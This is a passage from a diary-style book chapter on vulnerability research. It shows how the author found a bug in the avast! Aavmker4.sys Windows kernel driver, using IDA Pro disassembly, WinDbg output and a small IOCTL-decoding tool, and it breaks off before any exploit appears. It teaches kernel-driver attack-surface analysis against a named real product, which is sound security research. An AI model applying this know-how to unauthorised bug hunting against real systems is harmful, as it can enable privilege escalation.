@@ -1,0 +1,576 @@
+<html><head></head><body><div class="chapter" title="Chapter&#xA0;6.&#xA0;One Kernel to Rule Them All"><div class="titlepage"><div><div><h1 class="title"><a id="one_kernel_to_rule_them_all"/>Chapter 6. One Kernel to Rule Them All</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Saturday, March 8, 2008</em></span><a id="IDX-CHP-6-0001" class="indexterm"/><a id="IDX-CHP-6-0002" class="indexterm"/></p><p><span class="emphasis"><em>Dear Diary</em></span>,</p></div><p>After spending time auditing open source kernels and finding some interesting bugs, I wondered whether I could find a bug in a Microsoft Windows driver. There are lots of third-party drivers available for Windows, so choosing just a few to explore wasn’t easy. I finally chose some antivirus products, since they’re usually promising targets for bug hunting.<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-1" class="footnoteref">57</a>]</sup> I visited VirusTotal<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-2" class="footnoteref">58</a>]</sup> and chose the first antivirus product that I recognized on its list: avast! from ALWIL Software.<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-3" class="footnoteref">59</a>]</sup> That turned out to be a serendipitous decision.<a id="IDX-CHP-6-0003" class="indexterm"/><a id="IDX-CHP-6-0004" class="indexterm"/><a id="IDX-CHP-6-0005" class="indexterm"/></p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>On June 1, 2010, ALWIL Software was renamed AVAST Software</em></span>.</p></div><div class="sect1" title="6.1 Vulnerability Discovery"><div class="titlepage"><div><div><h1 class="title"><a id="vulnerability_discovery-id4"/>6.1 Vulnerability Discovery</h1></div></div></div><p>I used the following steps to find the vulnerability:<a id="IDX-CHP-6-0006" class="indexterm"/><a id="IDX-CHP-6-0007" class="indexterm"/><a id="IDX-CHP-6-0008" class="indexterm"/><a id="IDX-CHP-6-0009" class="indexterm"/><a id="IDX-CHP-6-0010" class="indexterm"/></p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>The vulnerability described in this chapter affects all Microsoft Windows platforms supported by avast! Professional 4.7. The platform that I used throughout this chapter was the default installation of Windows XP SP3 32-bit</em></span>.<a id="IDX-CHP-6-0011" class="indexterm"/></p></div><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Step 1: Prepare a VMware guest for kernel debugging.<a id="IDX-CHP-6-0012" class="indexterm"/><a id="IDX-CHP-6-0013" class="indexterm"/></p></li><li class="listitem"><p>Step 2: Generate a list of the drivers and device objects created by avast!</p></li><li class="listitem"><p>Step 3: Check the device security settings.</p></li><li class="listitem"><p>Step 4: List the IOCTLs.</p></li><li class="listitem"><p>Step 5: Find the user-controlled input values.</p></li><li class="listitem"><p>Step 6: Reverse engineer the IOCTL handler.</p></li></ul></div><div class="sect2" title="Step 1: Prepare a VMware Guest for Kernel Debugging"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_prepare_a_vmware_guest_for"/>Step 1: Prepare a VMware Guest for Kernel Debugging</h2></div></div></div><p>First, I set up a Windows XP VMware<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-4" class="footnoteref">60</a>]</sup> guest system that I configured for remote kernel debugging with WinDbg.<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-5" class="footnoteref">61</a>]</sup> The necessary steps are described in Section B.3.</p></div><div class="sect2" title="Step 2: Generate a List of the Drivers and Device Objects Created by avast!"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_generate_a_list_of_the_driv"/>Step 2: Generate a List of the Drivers and Device Objects Created by avast!</h2></div></div></div><p>After downloading and installing the latest version of avast! Professional<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-6" class="footnoteref">62</a>]</sup> in the VMware guest system, I used DriverView<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-7" class="footnoteref">63</a>]</sup> to generate a list of the drivers that avast! loaded.<a id="IDX-CHP-6-0014" class="indexterm"/></p><p>One of the benefits of DriverView is that it makes identification of third-party drivers easy. As illustrated in <a class="xref" href="ch06.html#a_list_of_the_avast_exclamation_drivers" title="Figure 6-1. A list of the avast! drivers in DriverView">Figure 6-1</a>, avast! loaded four drivers. I chose the first one on the list, called <span class="emphasis"><em>Aavmker4.sys</em></span>, and used IDA Pro<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-8" class="footnoteref">64</a>]</sup> to generate a list of the device objects of that driver.</p><div class="note" title="Note"><h3 class="title">Note</h3><p>A driver can create device objects to represent devices, or an interface to the driver, at any time by calling <em class="replaceable"><code>IoCreateDevice</code></em> or <em class="replaceable"><code>IoCreateDeviceSecure</code></em>.<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-9" class="footnoteref">65</a>]</sup></p></div><div class="figure"><a id="a_list_of_the_avast_exclamation_drivers"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject6_d1e6215"/><img src="httpatomoreillycomsourcenostarchimages939305.png.jpg" alt="A list of the avast! drivers in DriverView"/></div></div><p class="title">Figure 6-1. A list of the avast! drivers in DriverView</p></div><p>After IDA disassembled the driver, I started reading the assembly of the driver’s initialization routine, called <code class="literal">DriverEntry()</code>.<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-10" class="footnoteref">66</a>]</sup></p><a id="I_programlisting6_d1e6226"/><pre class="programlisting">[..]
+.text:000105D2 ; const WCHAR aDeviceAavmker4
+<strong class="userinput"><code>.text:000105D2 aDeviceAavmker4:                        ; DATA XREF: DriverEntry+12</code></strong>
+<strong class="userinput"><code>.text:000105D2                 unicode 0, &lt;\Device\AavmKer4&gt;,0</code></strong>
+[..]
+.text:00010620 ; NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, →
+PUNICODE_STRING RegistryPath)
+.text:00010620                 public DriverEntry
+.text:00010620 DriverEntry     proc near
+.text:00010620
+.text:00010620 SymbolicLinkName= UNICODE_STRING ptr −14h
+.text:00010620 DestinationString= UNICODE_STRING ptr −0Ch
+.text:00010620 DeviceObject    = dword ptr −4
+.text:00010620 DriverObject    = dword ptr  8
+.text:00010620 RegistryPath    = dword ptr  0Ch
+.text:00010620
+.text:00010620                 push    ebp
+.text:00010621                 mov     ebp, esp
+.text:00010623                 sub     esp, 14h
+.text:00010626                 push    ebx
+.text:00010627                 push    esi
+.text:00010628                 mov     esi, ds:RtlInitUnicodeString
+.text:0001062E                 push    edi
+.text:0001062F                 lea     eax, [ebp+DestinationString]
+<strong class="userinput"><code>.text:00010632                 push    offset aDeviceAavmker4 ; SourceString</code></strong>
+.text:00010637                 push    eax             ; DestinationString
+.text:00010638                 call    esi ; RtlInitUnicodeString
+.text:0001063A                 mov     edi, [ebp+DriverObject]
+.text:0001063D                 lea     eax, [ebp+DeviceObject]
+.text:00010640                 xor     ebx, ebx
+.text:00010642                 push    eax             ; DeviceObject
+.text:00010643                 push    ebx             ; Exclusive
+.text:00010644                 push    ebx             ; DeviceCharacteristics
+.text:00010645                 lea     eax, [ebp+DestinationString]
+.text:00010648                 push    22h             ; DeviceType
+.text:0001064A                 push    eax             ; DeviceName
+.text:0001064B                 push    ebx             ; DeviceExtensionSize
+.text:0001064C                 push    edi             ; DriverObject
+<strong class="userinput"><code>.text:0001064D                 call    ds:IoCreateDevice</code></strong>
+.text:00010653                 cmp     eax, ebx
+.text:00010655                 jl      loc_1075E
+[..]</pre><p>In the <code class="literal">DriverEntry()</code> function, a device called <code class="literal">\Device\AavmKer4</code> (see <code class="literal">.text:00010632</code> and <code class="literal">.text:000105D2</code>) is created using the <code class="literal">IoCreateDevice()</code> function at address <code class="literal">.text:0001064D</code>. The illustrated assembly snippet of <code class="literal">DriverEntry()</code> can be translated into the following C code:</p><a id="I_programlisting6_d1e6264"/><pre class="programlisting">[..]
+RtlInitUnicodeString (&amp;DestinationString, &amp;L"\\Device\\AavmKer4");
+retval = IoCreateDevice (DriverObject, 0, &amp;DestinationString,
+ 0x22, 0, 0, &amp;DeviceObject);
+[..]</pre></div><div class="sect2" title="Step 3: Check the Device Security Settings"><div class="titlepage"><div><div><h2 class="title"><a id="step_3_colon_check_the_device_security_s"/>Step 3: Check the Device Security Settings</h2></div></div></div><p>I then checked the security settings of the <code class="literal">AavmKer4</code> device using WinObj (see <a class="xref" href="ch06.html#navigating_to_the_security_settings_of_t" title="Figure 6-2. Navigating to the security settings of the AavmKer4 device in WinObj">Figure 6-2</a>).<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-11" class="footnoteref">67</a>]</sup><a id="IDX-CHP-6-0015" class="indexterm"/></p><div class="figure"><a id="navigating_to_the_security_settings_of_t"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject6_d1e6286"/><img src="httpatomoreillycomsourcenostarchimages939307.png.jpg" alt="Navigating to the security settings of the AavmKer4 device in WinObj"/></div></div><p class="title">Figure 6-2. Navigating to the security settings of the <code class="literal">AavmKer4</code> device in WinObj</p></div><p>To view the security settings of the device in WinObj, I right-clicked the device name, chose <span class="strong"><strong>Properties</strong></span> from the option list, and then chose the <span class="strong"><strong>Security</strong></span> tab. The device object allows every system user (Everyone group) to read from or to write to the device (see <a class="xref" href="ch06.html#viewing_the_security_settings_of_reverse" title="Figure 6-3. Viewing the security settings of \Device\AavmKer4">Figure 6-3</a>). This means that every user of the system is allowed to send data to the IOCTLs implemented by the driver, which is great—this makes this driver a valuable target!</p></div><div class="sect2" title="Step 4: List the IOCTLs"><div class="titlepage"><div><div><h2 class="title"><a id="step_4_colon_list_the_ioctls"/>Step 4: List the IOCTLs</h2></div></div></div><p>A Windows user space application must call <code class="literal">DeviceIoControl()</code> in order to send an IOCTL request to a kernel driver. Such calls to <code class="literal">DeviceIoControl()</code> cause the I/O manager of Windows to create an <code class="literal">IRP_MJ_DEVICE_CONTROL</code> request, which is sent to the topmost driver. The driver implements a special dispatch routine to handle <code class="literal">IRP_MJ_DEVICE_CONTROL</code> requests, and that dispatch routine is referenced through an array called <code class="literal">MajorFunction[]</code>. This array is an element of the <code class="literal">DRIVER_OBJECT</code> data structure, which can be found in <span class="emphasis"><em>ntddk.h</em></span> of the Windows Driver Kit.<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-12" class="footnoteref">68</a>]</sup> To save space, I removed the comments from the following code.<a id="IDX-CHP-6-0016" class="indexterm"/><a id="IDX-CHP-6-0017" class="indexterm"/><a id="IDX-CHP-6-0018" class="indexterm"/><a id="IDX-CHP-6-0019" class="indexterm"/></p><div class="figure"><a id="viewing_the_security_settings_of_reverse"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject6_d1e6347"/><img src="httpatomoreillycomsourcenostarchimages939309.png.jpg" alt="Viewing the security settings of \Device\AavmKer4"/></div></div><p class="title">Figure 6-3. Viewing the security settings of <code class="literal">\Device\AavmKer4</code></p></div><a id="I_programlisting6_d1e6352"/><pre class="programlisting">[..]
+typedef struct _DRIVER_OBJECT {
+    CSHORT Type;
+    CSHORT Size;
+    PDEVICE_OBJECT DeviceObject;
+    ULONG Flags;
+    PVOID DriverStart;
+    ULONG DriverSize;
+    PVOID DriverSection;
+    PDRIVER_EXTENSION DriverExtension;
+    UNICODE_STRING DriverName;
+    PUNICODE_STRING HardwareDatabase;
+    PFAST_IO_DISPATCH FastIoDispatch;
+    PDRIVER_INITIALIZE DriverInit;
+    PDRIVER_STARTIO DriverStartIo;
+    PDRIVER_UNLOAD DriverUnload;
+    <strong class="userinput"><code>PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];</code></strong>
+} DRIVER_OBJECT;
+[..]</pre><p>Below, the elements of the <code class="literal">MajorFunction[]</code> array are defined (also from <span class="emphasis"><em>ntddk.h</em></span>):<a id="IDX-CHP-6-0020" class="indexterm"/><a id="IDX-CHP-6-0021" class="indexterm"/></p><a id="I_programlisting6_d1e6373"/><pre class="programlisting">[..]
+#define IRP_MJ_CREATE                   0x00
+#define IRP_MJ_CREATE_NAMED_PIPE        0x01
+#define IRP_MJ_CLOSE                    0x02
+#define IRP_MJ_READ                     0x03
+#define IRP_MJ_WRITE                    0x04
+#define IRP_MJ_QUERY_INFORMATION        0x05
+#define IRP_MJ_SET_INFORMATION          0x06
+#define IRP_MJ_QUERY_EA                 0x07
+#define IRP_MJ_SET_EA                   0x08
+#define IRP_MJ_FLUSH_BUFFERS            0x09
+#define IRP_MJ_QUERY_VOLUME_INFORMATION 0x0a
+#define IRP_MJ_SET_VOLUME_INFORMATION   0x0b
+#define IRP_MJ_DIRECTORY_CONTROL        0x0c
+#define IRP_MJ_FILE_SYSTEM_CONTROL      0x0d
+<strong class="userinput"><code>#define IRP_MJ_DEVICE_CONTROL           0x0e</code></strong>
+#define IRP_MJ_INTERNAL_DEVICE_CONTROL  0x0f
+#define IRP_MJ_SHUTDOWN                 0x10
+#define IRP_MJ_LOCK_CONTROL             0x11
+#define IRP_MJ_CLEANUP                  0x12
+#define IRP_MJ_CREATE_MAILSLOT          0x13
+#define IRP_MJ_QUERY_SECURITY           0x14
+#define IRP_MJ_SET_SECURITY             0x15
+#define IRP_MJ_POWER                    0x16
+#define IRP_MJ_SYSTEM_CONTROL           0x17
+#define IRP_MJ_DEVICE_CHANGE            0x18
+#define IRP_MJ_QUERY_QUOTA              0x19
+#define IRP_MJ_SET_QUOTA                0x1a
+#define IRP_MJ_PNP                      0x1b
+#define IRP_MJ_PNP_POWER                IRP_MJ_PNP     // Obsolete....
+#define IRP_MJ_MAXIMUM_FUNCTION         0x1b
+[..]</pre><p>To list the IOCTLs implemented by a driver, I had to find the driver’s IOCTL dispatch routine. If I’d had access to the C code of the driver, this would have been easy, since I know that the assignment of the dispatch routine usually looks like this:</p><a id="I_programlisting6_d1e6380"/><pre class="programlisting">DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTL_dispatch_routine;</pre><p>Unfortunately, I didn’t have access to the source code of the avast! <span class="emphasis"><em>Aavmker4.sys</em></span> driver. How could I find the dispatch assignment using only the disassembly provided by IDA Pro?</p><p>To answer this question, I needed more information about the <code class="literal">DRIVER_OBJECT</code> data structure. I attached WinDbg to the VMware guest system and used the <code class="literal">dt</code> command (see Section B.2 for a detailed description of the following debugger commands) to display the available information about the structure:</p><a id="I_programlisting6_d1e6395"/><pre class="programlisting">kd&gt; <strong class="userinput"><code>.sympath SRV*c:\WinDBGSymbols*http://msdl.microsoft.com/download/symbols</code></strong>
+kd&gt; <strong class="userinput"><code>.reload</code></strong>
+[..]
+kd&gt; <strong class="userinput"><code>dt -v _DRIVER_OBJECT .</code></strong>
+nt!_DRIVER_OBJECT
+struct _DRIVER_OBJECT, 15 elements, 0xa8 bytes
+   +0x000 Type             : Int2B
+   +0x002 Size             : Int2B
+   +0x004 DeviceObject     :
+   +0x008 Flags            : Uint4B
+   +0x00c DriverStart      :
+   +0x010 DriverSize       : Uint4B
+   +0x014 DriverSection    :
+   +0x018 DriverExtension  :
+   +0x01c DriverName       : struct _UNICODE_STRING, 3 elements, 0x8 bytes
+      +0x000 Length           : Uint2B
+      +0x002 MaximumLength    : Uint2B
+      +0x004 Buffer           : Ptr32 to Uint2B
+   +0x024 HardwareDatabase :
+   +0x028 FastIoDispatch   :
+   +0x02c DriverInit       :
+   +0x030 DriverStartIo    :
+   +0x034 DriverUnload     :
+   <strong class="userinput"><code>+0x038 MajorFunction    : [28]</code></strong></pre><p>The debugger output shows that the <code class="literal">MajorFunction[]</code> array starts at structure offset <code class="literal">0x38</code>. After looking at the <span class="emphasis"><em>ntddk.h</em></span> header file of the Windows Driver Kit, I knew that <code class="literal">IRP_MJ_DEVICE_CONTROL</code> was located at offset <code class="literal">0x0e</code> in <code class="literal">MajorFunction[]</code> and that the element size of the array was a pointer (4 bytes on 32-bit platforms).</p><p>So the assignment can be expressed as the following:</p><a id="I_programlisting6_d1e6432"/><pre class="programlisting">In C: DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTL_dispatch_routine;
+Offsets         : DriverObject   +   0x38  +  0x0e * 4   = IOCTL_dispatch_routine;
+Simplified form : DriverObject   +   0x70                = IOCTL_dispatch_routine;</pre><p>There are countless ways to express this assignment in Intel assembly, but what I found in the driver code of avast! was these instructions:<a id="IDX-CHP-6-0022" class="indexterm"/></p><a id="I_programlisting6_d1e6441"/><pre class="programlisting">[..]
+.text:00010748                 mov     eax, [ebp+DriverObject]
+[..]
+.text:00010750                 mov     dword ptr [eax+70h], offset sub_1098C
+[..]</pre><p>At address <code class="literal">.text:00010748</code>, a pointer to a <code class="literal">DRIVER_OBJECT</code> is stored in <code class="literal">EAX</code>. Then at address <code class="literal">.text:00010750</code>, the function pointer of the IOCTL dispatch routine gets assigned to <code class="literal">MajorFunction[IRP_MJ_DEVICE_CONTROL]</code>.</p><a id="I_programlisting6_d1e6460"/><pre class="programlisting">Assignment in C: DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = sub_1098c;
+Offsets        : DriverObject + 0x70                                = sub_1098c;</pre><p>I had finally found the IOCTL dispatch routine of the driver: <code class="literal">sub_1098C</code>! The IOCTL dispatch routine could also be found with the help of the debugger:</p><a id="I_programlisting6_d1e6467"/><pre class="programlisting">kd&gt; <strong class="userinput"><code>!drvobj AavmKer4 7</code></strong>
+Driver object (86444f38) is for:
+*** ERROR: Symbol file could not be found.  Defaulted to export
+ symbols for Aavmker4.SYS -
+ \Driver\Aavmker4
+Driver Extension List: (id , addr)
+
+Device Object list:
+863a9150
+
+DriverEntry:   f792d620 Aavmker4
+DriverStartIo: 00000000
+DriverUnload:  00000000
+AddDevice:     00000000
+
+Dispatch routines:
+[00] IRP_MJ_CREATE                      f792d766         Aavmker4+0x766
+[01] IRP_MJ_CREATE_NAMED_PIPE           f792d766         Aavmker4+0x766
+[02] IRP_MJ_CLOSE                       f792d766         Aavmker4+0x766
+[03] IRP_MJ_READ                        f792d766         Aavmker4+0x766
+[04] IRP_MJ_WRITE                       f792d766         Aavmker4+0x766
+[05] IRP_MJ_QUERY_INFORMATION           f792d766         Aavmker4+0x766
+[06] IRP_MJ_SET_INFORMATION             f792d766         Aavmker4+0x766
+[07] IRP_MJ_QUERY_EA                    f792d766         Aavmker4+0x766
+[08] IRP_MJ_SET_EA                      f792d766         Aavmker4+0x766
+[09] IRP_MJ_FLUSH_BUFFERS               f792d766         Aavmker4+0x766
+[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    f792d766         Aavmker4+0x766
+[0b] IRP_MJ_SET_VOLUME_INFORMATION      f792d766         Aavmker4+0x766
+[0c] IRP_MJ_DIRECTORY_CONTROL           f792d766         Aavmker4+0x766
+[0d] IRP_MJ_FILE_SYSTEM_CONTROL         f792d766         Aavmker4+0x766
+<strong class="userinput"><code>[0e] IRP_MJ_DEVICE_CONTROL              f792d98c         Aavmker4+0x98c</code></strong>
+[..]</pre><p>The output of WinDbg shows that the <code class="literal">IRP_MJ_DEVICE_CONTROL</code> dispatch routine can be found at address <code class="literal">Aavmker4+0x98c</code>.</p><p>After I found the dispatch routine, I searched this function for the implemented IOCTLs. The IOCTL dispatch routine has the following prototype:<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-13" class="footnoteref">69</a>]</sup></p><a id="I_programlisting6_d1e6487"/><pre class="programlisting">NTSTATUS
+  DispatchDeviceControl(
+    __in struct _DEVICE_OBJECT  *DeviceObject,
+    __in struct _IRP  *Irp
+    )
+  { ... }</pre><p>The second function parameter is a pointer to an <span class="emphasis"><em>I/O request packet</em></span> (<span class="emphasis"><em>IRP</em></span>) structure. An IRP is the basic structure that the Windows I/O manager uses to communicate with drivers and allow drivers to communicate with each other. This structure transports the user-supplied IOCTL data as well as the requested IOCTL code.<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-14" class="footnoteref">70</a>]</sup><a id="IDX-CHP-6-0023" class="indexterm"/><a id="IDX-CHP-6-0024" class="indexterm"/><a id="IDX-CHP-6-0025" class="indexterm"/></p><p>I then had a look at the disassembly of the dispatch routine in order to generate a list of the IOCTLs:</p><a id="I_programlisting6_d1e6509"/><pre class="programlisting">[..]
+.text:0001098C ; int __stdcall sub_1098C(int, PIRP Irp)
+.text:0001098C sub_1098C       proc near               ; DATA XREF: DriverEntry+130
+[..]
+<strong class="userinput"><code>.text:000109B2                 mov     ebx, [ebp+Irp]  ; ebx = address of IRP</code></strong>
+<strong class="userinput"><code>.text:000109B5                 mov     eax, [ebx+60h]</code></strong>
+[..]</pre><p>A pointer to the IRP structure is stored in <code class="literal">EBX</code> at address <code class="literal">.text:000109B2</code> of the IOCTL dispatch routine. Then a value, located at offset <code class="literal">0x60</code> of the IRP structure, is referenced (see <code class="literal">.text:000109B5</code>).</p><a id="I_programlisting6_d1e6531"/><pre class="programlisting">kd&gt; <strong class="userinput"><code>dt -v -r 3 _IRP</code></strong>
+nt!_IRP
+struct _IRP, 21 elements, 0x70 bytes
+  +0x000 Type             : ??
+  +0x002 Size             : ??
+  +0x004 MdlAddress       : ????
+  +0x008 Flags            : ??
+[..]
+  <strong class="userinput"><code>+0x040 Tail             : union __unnamed, 3 elements, 0x30 bytes</code></strong>
+     +0x000 Overlay          : struct __unnamed, 8 elements, 0x28 bytes
+        +0x000 DeviceQueueEntry : struct _KDEVICE_QUEUE_ENTRY, 3 elements, 0x10 bytes
+        +0x000 DriverContext    : [4] ????
+        +0x010 Thread           : ????
+        +0x014 AuxiliaryBuffer  : ????
+        +0x018 ListEntry        : struct _LIST_ENTRY, 2 elements, 0x8 bytes
+        <strong class="userinput"><code>+0x020 CurrentStackLocation : ????</code></strong>
+[..]</pre><p>The output of WinDbg shows that the IRP structure member <code class="literal">CurrentStackLocation</code> is located at offset <code class="literal">0x60</code>. This structure is defined in <span class="emphasis"><em>ntddk.h</em></span> of the Windows Driver Kit:<a id="IDX-CHP-6-0026" class="indexterm"/></p><a id="I_programlisting6_d1e6556"/><pre class="programlisting">[..]
+//
+// I/O Request Packet (IRP) definition
+//
+typedef struct _IRP {
+[..]
+        <strong class="userinput"><code>//</code></strong>
+        <strong class="userinput"><code>// Current stack location - contains a pointer to the current</code></strong>
+        <strong class="userinput"><code>// IO_STACK_LOCATION structure in the IRP stack.  This field</code></strong>
+        <strong class="userinput"><code>// should never be directly accessed by drivers.  They should</code></strong>
+        <strong class="userinput"><code>// use the standard functions.</code></strong>
+        <strong class="userinput"><code>//</code></strong>
+
+        <strong class="userinput"><code>struct _IO_STACK_LOCATION *CurrentStackLocation;</code></strong>
+[..]</pre><p>The layout of the <code class="literal">_IO_STACK_LOCATION</code> structure is shown below (see <span class="emphasis"><em>ntddk.h</em></span> of the Windows Driver Kit):<a id="IDX-CHP-6-0027" class="indexterm"/></p><a id="I_programlisting6_d1e6591"/><pre class="programlisting">[..]
+<strong class="userinput"><code>typedef struct _IO_STACK_LOCATION {</code></strong>
+    UCHAR MajorFunction;
+    UCHAR MinorFunction;
+    UCHAR Flags;
+    UCHAR Control;
+[..]
+        //
+        // System service parameters for:  NtDeviceIoControlFile
+        //
+        // Note that the user's output buffer is stored in the
+        // UserBuffer field
+        // and the user's input buffer is stored in the SystemBuffer
+        // field.
+        //
+
+        struct {
+            <strong class="userinput"><code>ULONG OutputBufferLength;</code></strong>
+            <strong class="userinput"><code>ULONG POINTER_ALIGNMENT InputBufferLength;</code></strong>
+            <strong class="userinput"><code>ULONG POINTER_ALIGNMENT IoControlCode;</code></strong>
+            PVOID Type3InputBuffer;
+        } DeviceIoControl;
+[..]</pre><p>In addition to the <code class="literal">IoControlCode</code> of the requested IOCTL, this structure contains information about the size of the input and output buffer. Now that I had more information about the <code class="literal">_IO_STACK_LOCATION</code> structure, I took a second look at the disassembly:</p><a id="I_programlisting6_d1e6614"/><pre class="programlisting">[..]
+.text:0001098C ; int __stdcall sub_1098C(int, PIRP Irp)
+.text:0001098C sub_1098C     proc near               ; DATA XREF: DriverEntry+130
+[..]
+.text:000109B2        mov    ebx, [ebp+Irp]  ; ebx = address of IRP
+<strong class="userinput"><code>.text:000109B5        mov    eax, [ebx+60h]  ; eax = address of CurrentStackLocation</code></strong>
+<strong class="userinput"><code>.text:000109B8        mov    esi, [eax+8]    ; ULONG InputBufferLength</code></strong>
+.text:000109BB        mov    [ebp+var_1C], esi ; save InputBufferLength in var_1C
+<strong class="userinput"><code>.text:000109BE        mov    edx, [eax+4]    ; ULONG OutputBufferLength</code></strong>
+.text:000109C1        mov    [ebp+var_3C], edx ; save OutputBufferLength in var_3C
+<strong class="userinput"><code>.text:000109C4        mov    eax, [eax+0Ch]  ; ULONG IoControlCode</code></strong>
+<strong class="userinput"><code>.text:000109C7        mov    ecx, 0B2D6002Ch ; ecx = 0xB2D6002C</code></strong>
+<strong class="userinput"><code>.text:000109CC        cmp    eax, ecx        ; compare 0xB2D6002C with IoControlCode</code></strong>
+.text:000109CE        ja     loc_10D15
+[..]</pre><p>As I mentioned before, a pointer to <code class="literal">_IO_STACK_LOCATION</code> is stored in <code class="literal">EAX</code> at address <code class="literal">.text:000109B5</code>, and then at address <code class="literal">.text:000109B8</code> the <code class="literal">InputBufferLength</code> is stored in <code class="literal">ESI</code>. At <code class="literal">.text:000109BE</code> the <code class="literal">OutputBufferLength</code> is stored in <code class="literal">EDX</code>, and at <code class="literal">.text:000109C4</code> the <code class="literal">IoControlCode</code> is stored in <code class="literal">EAX</code>. Later, the requested IOCTL code stored in <code class="literal">EAX</code> is compared with the value <code class="literal">0xB2D6002C</code> (see address <code class="literal">.text:000109C7</code> and <code class="literal">.text:000109CC</code>). Hey, I found the first valid IOCTL code of the driver! I searched the function for all values that are compared with the requested IOCTL code in <code class="literal">EAX</code> and got a list of the supported IOCTLs of <span class="emphasis"><em>Aavmker4.sys</em></span>.</p></div><div class="sect2" title="Step 5: Find the User-Controlled Input Values"><div class="titlepage"><div><div><h2 class="title"><a id="step_5_colon_find_the_user-controlled_in"/>Step 5: Find the User-Controlled Input Values</h2></div></div></div><p>After I generated the list of all the supported IOCTLs, I tried to locate the buffer containing the user-supplied IOCTL input data. All <code class="literal">IRP_MJ_DEVICE_CONTROL</code> requests supply both an input buffer and an output buffer. The way the system describes these buffers depends on the <span class="emphasis"><em>data transfer type</em></span>. The transfer type is stored in the IOCTL code itself. Under Microsoft Windows, the IOCTL code values are normally created using the <code class="literal">CTL_CODE</code> macro.<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-15" class="footnoteref">71</a>]</sup> Here’s another excerpt from <span class="emphasis"><em>ntddk.h</em></span>:<a id="IDX-CHP-6-0028" class="indexterm"/><a id="IDX-CHP-6-0029" class="indexterm"/></p><a id="I_programlisting6_d1e6720"/><pre class="programlisting">[..]
+//
+// Macro definition for defining IOCTL and FSCTL function control codes.  Note
+// that function codes 0-2047 are reserved for Microsoft Corporation, and
+// 2048-4095 are reserved for customers.
+//
+
+<strong class="userinput"><code>#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \</code></strong>
+    <strong class="userinput"><code>((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \</code></strong>
+<strong class="userinput"><code>)</code></strong>
+
+[..]
+
+//
+// Define the method codes for how buffers are passed for I/O and FS controls
+//
+
+#define METHOD_BUFFERED                 0
+#define METHOD_IN_DIRECT                1
+#define METHOD_OUT_DIRECT               2
+#define METHOD_NEITHER                  3
+[..]</pre><p>The transfer type is specified using the <code class="literal">Method</code> parameter of the <code class="literal">CTL_CODE</code> macro. I wrote a little tool to reveal which data transfer type is used by the IOCTLs of <span class="emphasis"><em>Aavmker4.sys</em></span>:</p><div class="example"><a id="a_little_tool_that_i_wrote"/><p class="title">Example 6-1. A little tool that I wrote (<span class="emphasis"><em>IOCTL_method.c</em></span>) to show which data transfer type is used by the IOCTLs of <span class="emphasis"><em>Aavmker4.sys</em></span></p><div class="example-contents"><pre class="programlisting">01    #include &lt;windows.h&gt;
+02    #include &lt;stdio.h&gt;
+03
+04    int
+05    main (int argc, char *argv[])
+06    {
+07        unsigned int  method  = 0;
+08        unsigned int  code    = 0;
+09
+10        if (argc != 2) {
+11           fprintf (stderr, "Usage: %s &lt;IOCTL code&gt;\n", argv[0]);
+12           return 1;
+13        }
+14
+15        code = strtoul (argv[1], (char **) NULL, 16);
+16        method = code &amp; 3;
+17
+18        switch (method) {
+19           case 0:
+20              printf ("METHOD_BUFFERED\n");
+21              break;
+22           case 1:
+23              printf ("METHOD_IN_DIRECT\n");
+24              break;
+25           case 2:
+26              printf ("METHOD_OUT_DIRECT\n");
+27              break;
+28           case 3:
+29              printf ("METHOD_NEITHER\n");
+30              break;
+31           default:
+32              fprintf (stderr, "ERROR: invalid IOCTL data transfer method\n");
+33              break;
+34        }
+35
+36        return 0;
+37    }</pre></div></div><p>I then compiled the tool with the command-line C compiler of Visual Studio (<code class="literal">cl</code>):</p><a id="I_programlisting6_d1e6757"/><pre class="programlisting">C:\BHD&gt;<strong class="userinput"><code>cl /nologo IOCTL_method.c</code></strong>
+IOCTL_method.c</pre><p>The following output shows the tool from <a class="xref" href="ch06.html#a_little_tool_that_i_wrote" title="Example 6-1. A little tool that I wrote (IOCTL_method.c) to show which data transfer type is used by the IOCTLs of Aavmker4.sys">Example 6-1</a> in action:</p><a id="I_programlisting6_d1e6766"/><pre class="programlisting">C:\BHD&gt;<strong class="userinput"><code>IOCTL_method.exe B2D6002C</code></strong>
